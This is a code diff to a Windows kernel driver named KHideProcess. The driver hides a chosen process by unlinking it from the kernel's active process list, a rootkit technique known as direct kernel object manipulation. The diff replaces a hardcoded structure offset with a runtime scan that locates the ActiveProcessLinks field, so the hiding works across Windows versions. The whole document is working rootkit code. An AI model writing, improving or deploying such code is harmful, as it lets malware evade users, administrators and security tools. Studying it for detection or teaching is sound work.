@@ -1,5 +1,24 @@
 #include <ntifs.h>
 
+ULONG_PTR GetActiveProcessLinks() {
+	static ULONG_PTR activeProcesLinks = 0;
+	if (activeProcesLinks == 0) {
+		auto proc = PsInitialSystemProcess;
+		auto pid = PsGetProcessId(proc);
+		for (int i = 0; i < 0x800; i += sizeof(PVOID)) {
+			auto p = (char*)proc + i;
+			if (pid == *(HANDLE*)p) {
+				auto entry = (PLIST_ENTRY)(p + sizeof(HANDLE));
+				if (entry->Flink->Blink == entry) {
+					activeProcesLinks = i + sizeof(HANDLE);
+					break;
+				}
+			}
+		}
+	}
+	return activeProcesLinks;
+}
+
 void OnUnload(PDRIVER_OBJECT DriverObject) {
 	UNICODE_STRING sym = RTL_CONSTANT_STRING(L"\\??\\KHideProcess");
 	IoDeleteSymbolicLink(&sym);
@@ -13,7 +32,7 @@ NTSTATUS HideProcess(ULONG pid) {
 		return status;
 
 	// hide!
-	LIST_ENTRY* entry = (LIST_ENTRY*)((char*)process + 0x1d8);
+	LIST_ENTRY* entry = (LIST_ENTRY*)((char*)process + GetActiveProcessLinks());
 	RemoveEntryList(entry);
 	entry->Blink = entry->Flink = nullptr;
 
@@ -49,6 +68,11 @@ NTSTATUS OnWrite(PDEVICE_OBJECT, PIRP Irp) {
 
 
 extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING) {
+	auto offset = GetActiveProcessLinks();
+	DbgPrint("ActiveProcessLinks: 0x%llX\n", offset);
+	if (offset == 0)
+		return STATUS_UNSUCCESSFUL;
+
 	PDEVICE_OBJECT devObj;
 	UNICODE_STRING name = RTL_CONSTANT_STRING(L"\\Device\\KHideProcess");
 	auto status = IoCreateDevice(DriverObject, 0, &name, FILE_DEVICE_UNKNOWN,
